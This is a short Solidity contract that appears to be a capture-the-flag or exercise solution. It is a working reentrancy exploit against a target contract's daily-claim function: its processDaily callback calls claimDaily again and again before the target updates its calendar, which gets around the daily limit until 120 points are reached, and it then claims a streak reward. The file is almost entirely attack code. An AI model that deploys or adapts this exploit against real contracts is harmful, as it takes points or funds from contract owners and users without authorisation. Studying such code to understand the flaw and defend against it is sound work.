pragma solidity ^0.8.20;

//establish header for the target client contract
interface IDailyClient {
    function processDaily(uint256 newPoints) external;
}

// alternateively copy over target class
interface IPointless {
    function claimDaily() external;
    function claimStreakReward(bytes32 token) external;

}

//instance of expected client
contract Demo is IDailyClient {
    IPointless immutable pointless;
    uint256 points;

    constructor(IPointless addr) {
      pointless = addr;
    }

    //claim daily calls client's processDaily BEFORE updating calendar
    //by recursively calling claimDaily we can circumvent daily claim limit
    function processDaily(uint256 newPoints) external {
      // update internal point counter
      //points = newPoints;
      points = newPoints;
      if (points < 120) {
        pointless.claimDaily();
      }
    }

    function foo(bytes32 token) external {
        pointless.claimDaily();

        pointless.claimStreakReward(token);
    }
}